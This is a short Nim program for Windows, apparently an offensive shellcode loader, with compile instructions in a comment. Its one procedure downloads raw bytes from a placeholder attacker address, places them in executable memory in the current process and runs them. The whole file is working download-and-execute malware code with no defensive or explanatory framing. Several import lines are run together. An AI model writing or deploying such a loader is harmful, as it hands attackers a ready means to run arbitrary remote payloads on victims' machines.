#[ 
   Compilation: 
   nimble install winim
   nim c -d:mingw --cpu:amd64 /tmp/pack.nim
 ]#

importwinim
importwinim/lean
importhttpclient
func toByteSeq*(str: string): seq[byte] {.inline.} = 
    @(str.toOpenArrayByte(0, str.high))

proc DownloadExecute(url:string):void=
    var client= newHttpClient()
    var response: string = client.getContent(url)
    var shellcode: seq[byte] = toByteSeq(response)
    let tProcess = GetCurrentProcessId()
    var pHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess)

    let rPtr = VirtualAllocEx(
        pHandle,
        NULL,
        cast[SIZE_T](len(shellcode)),
        0x3000,
        PAGE_EXECUTE_READ_WRITE
    )

    defer: CloseHandle(pHandle)
    copyMem(rPtr, shellcode[0].addr, len(shellcode))
    let f = cast[proc(){.nimcall.}](rPtr)
    f()

when defined(windows):
    when isMainModule:
        DownloadExecute("http://attacker_ip/test.bin")